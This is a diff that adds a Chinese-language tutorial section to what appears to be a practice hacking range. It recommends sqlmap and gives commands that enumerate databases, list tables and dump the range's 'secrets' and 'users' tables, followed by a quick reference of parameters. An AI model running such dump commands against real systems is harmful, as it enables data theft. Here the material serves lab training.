@@ -1,0 +1,25 @@
+<h4>sqlmap（推荐）</h4>
+<p>SQL 注入自动化之王，支持 6 大注入类型、50+ 数据库、WAF 绕过。</p>
+<pre>
+# 基本语法（以 GET 注入为例）
+sqlmap -u "<?php echo site_url('modules/sqli/get.php'); ?>?id=1" [options]
+
+# 1. 爆所有数据库
+sqlmap -u "<?php echo site_url('modules/sqli/get.php'); ?>?id=1" --dbs --batch
+
+# 2. 指定数据库，列出所有表
+sqlmap -u "<?php echo site_url('modules/sqli/get.php'); ?>?id=1" -D bafanglab --tables --batch
+
+# 3. 导出 secrets 表数据（通关凭证）
+sqlmap -u "<?php echo site_url('modules/sqli/get.php'); ?>?id=1" -D bafanglab -T secrets --dump --batch
+</pre>
+<p><b>本靶场实测：</b>全部 5 种子注入类型（UNION/报错/布尔盲注/时间盲注/POST）均被 sqlmap <b>3 秒内自动识别并导出</b>。当前库：bafanglab，目标表：secrets / users。</p>
+<p><b>常用参数速查：</b></p>
+<ul>
+<li><code>--dbs</code> 爆所有库</li>
+<li><code>-D dbname --tables</code> 列出指定库的表</li>
+<li><code>-D dbname -T tablename --dump</code> 导出表数据</li>
+<li><code>--data "POST=body"</code> 指定 POST 数据</li>
+<li><code>--technique=B/T/U/E/S/Q</code> 只跑指定类型</li>
+<li><code>--batch</code> 自动确认所有交互</li>
+</ul>
